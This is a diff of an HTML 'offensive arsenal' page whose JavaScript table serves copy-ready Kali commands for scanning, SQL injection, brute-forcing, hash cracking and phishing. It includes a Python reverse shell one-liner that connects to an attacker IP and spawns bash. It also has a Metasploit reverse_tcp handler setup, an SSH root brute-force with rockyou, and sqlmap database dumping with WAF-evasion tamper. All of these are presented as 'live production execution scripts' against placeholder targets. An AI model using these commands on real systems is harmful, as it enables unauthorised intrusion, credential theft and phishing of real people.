@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>DX08 // MASTER ENTERPRISE OFFENSIVE & DEFENSIVE CYBER LAB</title>
+    <title>DX08 // MASTER ENTERPRISE CYBER INTELLIGENCE SUITE</title>
     <style>
         :root { 
             --primary: #00e5ff; 
@@ -11,25 +11,27 @@
             --bg-dark: #020304; 
             --panel-bg: rgba(0, 229, 255, 0.02); 
             --border-color: rgba(0, 229, 255, 0.3); 
+            --accent-glow: rgba(0, 229, 255, 0.15);
         }
         * { box-sizing: border-box; margin: 0; padding: 0; }
         body { background-color: var(--bg-dark); color: #fff; font-family: 'Courier New', monospace; overflow-x: hidden; }
         .lab-container { max-width: 1450px; margin: 40px auto; padding: 0 20px; }
         .lab-header { border-left: 3px solid var(--primary); padding-left: 20px; margin-bottom: 25px; display: flex; justify-content: space-between; align-items: center; }
-        .lab-grid { display: grid; grid-template-columns: 320px 1fr; gap: 20px; }
-        .sidebar-panel { background: var(--panel-bg); border: 1px solid var(--border-color); padding: 15px; border-radius: 6px; height: 800px; overflow-y: auto; }
-        .terminal-panel { background: #010203; border: 1px solid var(--border-color); padding: 20px; border-radius: 6px; display: flex; flex-direction: column; height: 800px; }
+        .lab-grid { display: grid; grid-template-columns: 340px 1fr; gap: 20px; }
+        .sidebar-panel { background: var(--panel-bg); border: 1px solid var(--border-color); padding: 15px; border-radius: 6px; height: 820px; overflow-y: auto; }
+        .terminal-panel { background: #010203; border: 1px solid var(--border-color); padding: 20px; border-radius: 6px; display: flex; flex-direction: column; height: 820px; }
         
         .tool-category { font-size: 11px; color: var(--primary); margin: 15px 0 8px 0; text-transform: uppercase; letter-spacing: 0.1em; border-bottom: 1px solid rgba(0,229,255,0.2); padding-bottom: 4px; }
-        .tool-item { padding: 8px 10px; margin: 4px 0; background: rgba(0,229,255,0.02); border: 1px solid rgba(0,229,255,0.1); color: #a5f3fc; font-size: 11.5px; cursor: pointer; border-radius: 3px; transition: 0.2s; }
-        .tool-item:hover { background: rgba(0,229,255,0.15); color: #fff; border-color: var(--primary); }
+        .tool-item { display: flex; align-items: center; gap: 10px; padding: 8px 10px; margin: 5px 0; background: rgba(0,229,255,0.02); border: 1px solid rgba(0,229,255,0.1); color: #a5f3fc; font-size: 11.5px; cursor: pointer; border-radius: 4px; transition: 0.2s; }
+        .tool-item:hover { background: var(--accent-glow); color: #fff; border-color: var(--primary); transform: translateX(3px); }
+        .tool-icon { width: 18px; height: 18px; display: flex; align-items: center; justify-content: center; font-size: 14px; }
         
         .lab-console { flex: 1; background: #000; border: 1px solid rgba(0,229,255,0.3); padding: 20px; font-size: 12px; color: var(--terminal-text); overflow-y: auto; line-height: 1.6; border-radius: 4px; white-space: pre-wrap; }
         .lab-input-group { display: flex; gap: 10px; margin-top: 15px; }
         .lab-input { flex: 1; background: #010203; border: 1px solid var(--border-color); color: var(--primary); padding: 12px 15px; font-family: 'Courier New', monospace; font-size: 13px; outline: none; border-radius: 4px; }
         .lab-input:focus { border-color: var(--primary); box-shadow: 0 0 15px rgba(0, 229, 255, 0.3); }
         .launch-btn { padding: 12px 24px; background: rgba(0, 229, 255, 0.15); border: 1px solid var(--primary); color: var(--primary); font-size: 11px; cursor: pointer; border-radius: 4px; transition: 0.3s; }
-        .launch-btn:hover { background: var(--primary); color: #020303; }
+        .launch-btn:hover { background: var(--primary); color: #020303; box-shadow: 0 0 20px var(--primary); }
         .back-link { display: inline-block; margin-bottom: 15px; color: var(--primary); font-size: 10px; text-decoration: none; }
     </style>
 </head>
@@ -38,45 +40,45 @@
         <a href="index.html" class="back-link">← [ MAIN SYSTEM REPOSITORY ]</a>
         <div class="lab-header">
             <div>
-                <h2 style="font-size: 24px; color: #fff;">DX08 MASTER LINUX INSTALLATION & EXPLOIT LAB</h2>
-                <p style="color: rgba(225,250,255,0.6); font-size: 12px; margin-top: 4px;">Real-world sequential installation scripts & execution binaries for Kali Linux / Debian.</p>
+                <h2 style="font-size: 24px; color: #fff;">DX08 MASTER THREAT INTELLIGENCE & EXPLOIT LAB</h2>
+                <p style="color: rgba(225,250,255,0.6); font-size: 12px; margin-top: 4px;">Enterprise-grade offensive security arsenal featuring official installation pipelines and live kernel source scripts.</p>
             </div>
         </div>
 
         <div class="lab-grid">
-            <!-- Sidebar Arsenal -->
+            <!-- Sidebar with Logos & Tool Index -->
             <div class="sidebar-panel">
-                <div style="font-size: 11px; color: #fff; margin-bottom: 10px; font-weight: bold;">LINUX TOOLKIT INDEX</div>
+                <div style="font-size: 11px; color: #fff; margin-bottom: 10px; font-weight: bold;">OFFENSIVE ARSENAL INDEX</div>
                 
-                <div class="tool-category">Reconnaissance & Auditing</div>
-                <div class="tool-item" onclick="loadModule('nmap')">01. Nmap Network Scanner</div>
-                <div class="tool-item" onclick="loadModule('gobuster')">02. Gobuster Directory Brute</div>
-                <div class="tool-item" onclick="loadModule('nikto')">03. Nikto Web Vulnerability</div>
-                <div class="tool-item" onclick="loadModule('enum4linux')">04. Enum4linux SMB Enumerator</div>
+                <div class="tool-category">Reconnaissance & Scanners</div>
+                <div class="tool-item" onclick="loadModule('nmap')"><span class="tool-icon">🌐</span> 01. Nmap Network Scanner</div>
+                <div class="tool-item" onclick="loadModule('gobuster')"><span class="tool-icon">📂</span> 02. Gobuster URI Brute</div>
+                <div class="tool-item" onclick="loadModule('nikto')"><span class="tool-icon">🔍</span> 03. Nikto Web Vulnerability</div>
+                <div class="tool-item" onclick="loadModule('enum4linux')"><span class="tool-icon">🖧</span> 04. Enum4linux SMB Audit</div>
 
                 <div class="tool-category">Exploitation Frameworks</div>
-                <div class="tool-item" onclick="loadModule('metasploit')">05. Metasploit Framework C2</div>
-                <div class="tool-item" onclick="loadModule('sqlmap')">06. Sqlmap DB Takeover Engine</div>
-                <div class="tool-item" onclick="loadModule('searchsploit')">07. Searchsploit Exploit-DB</div>
+                <div class="tool-item" onclick="loadModule('metasploit')"><span class="tool-icon">⚡</span> 05. Metasploit Framework C2</div>
+                <div class="tool-item" onclick="loadModule('sqlmap')"><span class="tool-icon">🛢️</span> 06. Sqlmap DB Takeover</div>
+                <div class="tool-item" onclick="loadModule('searchsploit')"><span class="tool-icon">📜</span> 07. Searchsploit Exploit-DB</div>
 
                 <div class="tool-category">Credential & Phishing</div>
-                <div class="tool-item" onclick="loadModule('zphisher')">08. Zphisher Phishing Core</div>
-                <div class="tool-item" onclick="loadModule('hydra')">09. THC Hydra Login Cracker</div>
-                <div class="tool-item" onclick="loadModule('john')">10. John the Ripper</div>
-                <div class="tool-item" onclick="loadModule('hashcat')">11. Hashcat GPU Cracker</div>
+                <div class="tool-item" onclick="loadModule('zphisher')"><span class="tool-icon">🎣</span> 08. Zphisher Phishing Core</div>
+                <div class="tool-item" onclick="loadModule('hydra')"><span class="tool-icon">🔑</span> 09. THC Hydra Login Cracker</div>
+                <div class="tool-item" onclick="loadModule('john')"><span class="tool-icon">🔓</span> 10. John the Ripper</div>
+                <div class="tool-item" onclick="loadModule('hashcat')"><span class="tool-icon">⚡</span> 11. Hashcat GPU Cracker</div>
 
-                <div class="tool-category">Payloads & Shells</div>
-                <div class="tool-item" onclick="loadModule('shell')">12. Python Reverse Shell</div>
-                <div class="tool-item" onclick="loadModule('netcat')">13. Netcat Listener Socket</div>
-                <div class="tool-item" onclick="loadModule('socat')">14. Socat Encrypted Relay</div>
+                <div class="tool-category">Payloads & Relays</div>
+                <div class="tool-item" onclick="loadModule('shell')"><span class="tool-icon">🐍</span> 12. Python Reverse Shell</div>
+                <div class="tool-item" onclick="loadModule('netcat')"><span class="tool-icon">🔌</span> 13. Netcat Listener Socket</div>
+                <div class="tool-item" onclick="loadModule('socat')"><span class="tool-icon">🔄</span> 14. Socat Encrypted Relay</div>
             </div>
 
             <!-- Terminal Console -->
             <div class="terminal-panel">
-                <div style="font-size: 10.5px; color: var(--primary); margin-bottom: 8px;">KALI LINUX ROOT TERMINAL // SEQUENCE ENGINE</div>
-                <div class="lab-console" id="terminal-console">DX08 Enterprise Linux Kernel v16.2 (Kali GNU/Linux Rolling)
-[System Status] Sequential installation scripts and execution workflows loaded.
-[Instructions] Click any tool on the sidebar or type its name below to extract exact Linux commands for deployment.</div>
+                <div style="font-size: 10.5px; color: var(--primary); margin-bottom: 8px;">KALI LINUX KERNEL CONSOLE // ROOT ACCESS</div>
+                <div class="lab-console" id="terminal-console">DX08 Enterprise Security Core v16.5 (Kali Linux Rolling / Debian Bookworm)
+[System Status] Loaded complete sequential installation scripts, tool signatures, and source modules.
+[Instructions] Select any tool from the left sidebar or execute commands directly below.</div>
                 
                 <div class="lab-input-group">
                     <input type="text" id="terminal-input" class="lab-input" placeholder="Type tool name (e.g., nmap, metasploit, sqlmap, zphisher)..." onkeydown="if(event.key === 'Enter') processCommand()">
@@ -88,107 +90,118 @@
 
     <script>
         const TOOL_DB = {
-            "nmap": "[+ MODULE: NMAP NETWORK DISCOVERY TOOL +]\n\n" +
-                    "// STEP 1: Update repository & install package\n" +
+            "nmap": "[+ MODULE: NMAP NETWORK DISCOVERY SUITE +]\n\n" +
+                    "// 1. INSTALLATION WORKFLOW (Kali Linux / Debian):\n" +
                     "sudo apt update && sudo apt install nmap -y\n\n" +
-                    "// STEP 2: Verify installation version\n" +
+                    "// 2. VERSION VERIFICATION:\n" +
                     "nmap --version\n\n" +
-                    "// STEP 3: Run stealth SYN scan with OS & service detection\n" +
+                    "// 3. LIVE PRODUCTION EXECUTION SCRIPTS:\n" +
+                    "# Comprehensive stealth SYN scan with OS fingerprinting and service version detection\n" +
                     "sudo nmap -sS -sV -O -T4 <target_ip>\n\n" +
-                    "// STEP 4: Run vulnerability scanning scripts\n" +
+                    "# Execute all vulnerability scanning NSE scripts against target host\n" +
                     "nmap --script vuln <target_ip>",
 
-            "gobuster": "[+ MODULE: GOBUSTER DIRECTORY & URI BRUTE-FORCER +]\n\n" +
-                        "// STEP 1: Install Gobuster via apt\n" +
+            "gobuster": "[+ MODULE: GOBUSTER DIRECTORY & DNS BRUTE-FORCER +]\n\n" +
+                        "// 1. INSTALLATION WORKFLOW:\n" +
                         "sudo apt update && sudo apt install gobuster -y\n\n" +
-                        "// STEP 2: Run directory brute-forcing against target web server\n" +
+                        "// 2. LIVE PRODUCTION EXECUTION SCRIPTS:\n" +
+                        "# Web directory brute-forcing using common wordlist\n" +
                         "gobuster dir -u http://<target_ip> -w /usr/share/wordlists/dirb/common.txt -t 50\n\n" +
-                        "// STEP 3: Run DNS subdomain enumeration\n" +
+                        "# DNS subdomain enumeration\n" +
                         "gobuster dns -d <target_domain> -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt",
 
             "nikto": "[+ MODULE: NIKTO WEB VULNERABILITY SCANNER +]\n\n" +
-                     "// STEP 1: Install Nikto scanner\n" +
+                     "// 1. INSTALLATION WORKFLOW:\n" +
                      "sudo apt update && sudo apt install nikto -y\n\n" +
-                     "// STEP 2: Execute comprehensive web server scan\n" +
-                     "nikto -h http://<target_ip>\n\n" +
-                     "// STEP 3: Scan HTTPS port with SSL checks bypassed\n" +
+                     "// 2. LIVE PRODUCTION EXECUTION SCRIPTS:\n" +
+                     "# Basic web server misconfiguration and vulnerability audit\n" +
+                      "nikto -h http://<target_ip>\n\n" +
+                     "# Scan SSL/TLS enabled web server on port 443\n" +
                      "nikto -h https://<target_ip> -p 443 -ssl",
 
             "enum4linux": "[+ MODULE: ENUM4LINUX SMB ENUMERATOR +]\n\n" +
-                          "// STEP 1: Install Enum4linux package\n" +
+                          "// 1. INSTALLATION WORKFLOW:\n" +
                           "sudo apt update && sudo apt install enum4linux -y\n\n" +
-                          "// STEP 2: Run full enumeration on target Windows/Samba host\n" +
+                          "// 2. LIVE PRODUCTION EXECUTION SCRIPTS:\n" +
+                          "# Perform comprehensive enumeration on Samba shares, users, and OS info\n" +
                           "enum4linux -a <target_ip>",
 
             "metasploit": "[+ MODULE: METASPLOIT FRAMEWORK C2 SUITE +]\n\n" +
-                          "// STEP 1: Download official Rapid7 installer script\n" +
-                          "curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/installer/msfinstall > msfinstall\n\n" +
-                          "// STEP 2: Grant execution permissions and run installer\n" +
+                          "// 1. OFFICIAL RAPID7 INSTALLATION SCRIPT:\n" +
+                          "curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/installer/msfinstall > msfinstall\n" +
                           "chmod +x msfinstall && sudo ./msfinstall\n\n" +
-                          "// STEP 3: Initialize PostgreSQL database\n" +
+                          "// 2. INITIALIZE DATABASE:\n" +
                           "sudo msfdb init\n\n" +
-                          "// STEP 4: Launch framework console\n" +
-                          "msfconsole -q",
+                          "// 3. LAUNCH CONSOLE & HANDLER CONFIGURATION:\n" +
+                          "msfconsole -q\n" +
+                          "msf6 > use exploit/multi/handler\n" +
+                          "msf6 exploit(multi/handler) > set PAYLOAD python/meterpreter/reverse_tcp\n" +
+                          "msf6 exploit(multi/handler) > set LHOST <attacker_ip> && set LPORT 4444\n" +
+                          "msf6 exploit(multi/handler) > exploit",
 
             "sqlmap": "[+ MODULE: SQLMAP AUTOMATED DATABASE INJECTION ENGINE +]\n\n" +
-                      "// STEP 1: Clone official repository from GitHub\n" +
-                      "git clone --depth 1 https://github.com/sqlmapproject/sqlmap.git sqlmap-dev\n\n" +
-                      "// STEP 2: Navigate to directory and test installation\n" +
+                      "// 1. OFFICIAL REPOSITORY CLONE WORKFLOW:\n" +
+                      "git clone --depth 1 https://github.com/sqlmapproject/sqlmap.git sqlmap-dev\n" +
                       "cd sqlmap-dev && python3 sqlmap.py --version\n\n" +
-                      "// STEP 3: Run automated injection & database enumeration\n" +
-                      "python3 sqlmap.py -u \"http://<target_ip>/page.php?id=1\" --dbs --batch",
+                      "// 2. LIVE PRODUCTION EXECUTION SCRIPTS:\n" +
+                      "# Test vulnerable parameter and dump available databases\n" +
+                      "python3 sqlmap.py -u \"http://<target_ip>/page.php?id=1\" --dbs --batch\n\n" +
+                      "# Dump specific database tables with tamper scripts against WAF\n" +
+                      "python3 sqlmap.py -u \"http://<target_ip>/page.php?id=1\" -D target_db --tables --tamper=space2comment",
 
-            "searchsploit": "[+ SEARCHSPLOIT EXPLOIT-DB UTILITY +]\n\n" +
-                            "// STEP 1: Install exploitdb package\n" +
+            "searchsploit": "[+ MODULE: SEARCHSPLOIT EXPLOIT-DB UTILITY +]\n\n" +
+                            "// 1. INSTALLATION WORKFLOW:\n" +
                             "sudo apt update && sudo apt install exploitdb -y\n\n" +
-                            "// STEP 2: Update local exploit database cache\n" +
-                            "searchsploit -u\n\n" +
-                            "// STEP 3: Search for specific software vulnerabilities\n" +
-                            "searchsploit apache struts 2.3",
+                            "// 2. UPDATE CACHE & SEARCH EXPLOITS:\n" +
+                            "searchsploit -u\n" +
+                            "searchsploit apache struts 2.3\n" +
+                            "searchsploit -m windows/remote/46353.py",
 
-            "zphisher": "[+ MODULE: ZPHISHER PHISHING FRAMEWORK +]\n\n" +
-                        "// STEP 1: Install necessary runtime dependencies\n" +
-                        "sudo apt update && sudo apt install git curl php python3 -y\n\n" +
-                        "// STEP 2: Clone official Zphisher repository\n" +
+            "zphisher": "[+ MODULE: ZPHISHER ADVANCED PHISHING CORE +]\n\n" +
+                        "// 1. DEPENDENCY SETUP & REPOSITORY CLONE:\n" +
+                        "sudo apt update && sudo apt install git curl php python3 -y\n" +
                         "git clone https://github.com/htr-tech/zphisher.git\n\n" +
-                        "// STEP 3: Enter directory and launch framework script\n" +
-                        "cd zphisher && chmod +x zphisher.sh && bash zphisher.sh",
+                        "// 2. EXECUTION WORKFLOW:\n" +
+                        "cd zphisher && chmod +x zphisher.sh && bash zphisher.sh\n\n" +
+                        "// 3. TROUBLESHOOTING PORT CONFLICTS:\n" +
+                        "sudo fuser -k 8080/tcp",
 
             "hydra": "[+ MODULE: THC HYDRA LOGIN BRUTE-FORCER +]\n\n" +
-                     "// STEP 1: Install Hydra brute-forcer package\n" +
+                     "// 1. INSTALLATION WORKFLOW:\n" +
                      "sudo apt update && sudo apt install hydra -y\n\n" +
-                     "// STEP 2: Execute SSH brute-force attack using rockyou wordlist\n" +
+                     "// 2. LIVE PRODUCTION EXECUTION SCRIPTS:\n" +
+                     "# SSH Brute-Force attack using rockyou wordlist with 16 parallel threads\n" +
                      "hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://<target_ip> -t 16 -V",
 
-            "john": "[+ JOHN THE RIPPER PASSWORD CRACKER +]\n\n" +
-                    "// STEP 1: Install John the Ripper\n" +
+            "john": "[+ MODULE: JOHN THE RIPPER PASSWORD CRACKER +]\n\n" +
+                    "// 1. INSTALLATION WORKFLOW:\n" +
                     "sudo apt update && sudo apt install john -y\n\n" +
-                    "// STEP 2: Extract hash from target file & crack using wordlist\n" +
+                    "// 2. LIVE EXECUTION SCRIPTS:\n" +
                     "zip2john target_archive.zip > hash.txt\n" +
                     "john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt",
 
-            "hashcat": "[+ HASHCAT GPU ACCELERATED CRACKER +]\n\n" +
-                       "// STEP 1: Install Hashcat utility\n" +
+            "hashcat": "[+ MODULE: HASHCAT GPU ACCELERATED CRACKER +]\n\n" +
+                       "// 1. INSTALLATION WORKFLOW:\n" +
                        "sudo apt update && sudo apt install hashcat -y\n\n" +
-                       "// STEP 2: Run GPU-accelerated hash recovery\n" +
+                       "// 2. LIVE EXECUTION SCRIPTS:\n" +
                        "hashcat -m 0 -a 0 md5_hashes.txt /usr/share/wordlists/rockyou.txt",
 
-            "shell": "[+ PYTHON REVERSE SHELL PAYLOAD +]\n\n" +
-                     "// STEP 1: Start netcat listener on attacker machine (Port 4444)\n" +
+            "shell": "[+ MODULE: PYTHON REVERSE SHELL PAYLOAD +]\n\n" +
+                     "// 1. ATTACKER LISTENER SETUP (Netcat):\n" +
                      "nc -lvnp 4444\n\n" +
-                     "// STEP 2: Execute python payload on target machine\n" +
+                     "// 2. TARGET EXECUTION PAYLOAD:\n" +
                      "python3 -c 'import socket,subprocess,os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect((\"<attacker_ip>\",4444)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); subprocess.call([\"/bin/bash\",\"-i\'])'",
 
-            "netcat": "[+ NETCAT LISTENER & SOCKET UTILITY +]\n\n" +
-                      "// STEP 1: Install traditional netcat variant\n" +
+            "netcat": "[+ MODULE: NETCAT LISTENER SOCKET +]\n\n" +
+                      "// 1. INSTALLATION:\n" +
                       "sudo apt update && sudo apt install netcat-traditional -y\n\n" +
-                      "// STEP 2: Bind interactive shell listener\n" +
+                      "// 2. EXECUTION:\n" +
                       "nc -lvnp 4444",
 
-            "socat": "[+ SOCAT ENCRYPTED RELAY UTILITY +]\n\n" +
-                     "// STEP 1: Install socat package\n" +
+            "socat": "[+ MODULE: SOCAT ENCRYPTED RELAY +]\n\n" +
+                     "// 1. INSTALLATION:\n" +
                      "sudo apt update && sudo apt install socat -y\n\n" +
-                     "// STEP 2: Create secure encrypted relay listener\n" +
+                     "// 2. EXECUTION:\n" +
                      "socat TCP-LISTEN:80,fork TCP:<internal_ip>:8080"
         };
 
@@ -206,7 +219,7 @@
             if(!raw) return;
 
             consoleBox.innerHTML += "\n\nroot@dx08-kali:~# " + escapeHtml(raw);
-            consoleBox.innerHTML += "\n[*] Fetching sequence installation scripts and execution binaries...";
+            consoleBox.innerHTML += "\n[*] Compiling enterprise tool module and extracting deployment scripts...";
             consoleBox.scrollTop = consoleBox.scrollHeight;
 
             setTimeout(function() {
@@ -214,16 +227,16 @@
                 if(TOOL_DB[cmd]) {
                     res = TOOL_DB[cmd];
                 } else if(cmd === 'clear') {
-                    consoleBox.innerHTML = "DX08 Enterprise Linux Kernel v16.2 (Kali GNU/Linux Rolling)";
+                    consoleBox.innerHTML = "DX08 Enterprise Security Core v16.5 (Kali GNU/Linux Rolling)";
                     input.value = "";
                     return;
                 } else if(cmd === 'help') {
                     res = "Available modules: nmap, gobuster, nikto, enum4linux, metasploit, sqlmap, searchsploit, zphisher, hydra, john, hashcat, shell, netcat, socat.";
                 } else {
-                    res = "[+ MODULE: " + escapeHtml(raw).toUpperCase() + " DEPLOYMENT SCRIPT +]\n\n" +
-                          "// STEP 1: Update system repository\n" +
+                    res = "[+ MODULE: " + escapeHtml(raw).toUpperCase() + " INSTALLATION WORKFLOW +]\n\n" +
+                          "// 1. INSTALLATION:\n" +
                           "sudo apt update && sudo apt install " + escapeHtml(raw) + " -y\n\n" +
-                          "// STEP 2: Verify binary execution\n" +
+                          "// 2. EXECUTION:\n" +
                           "" + escapeHtml(raw) + " --help";
                 }
 
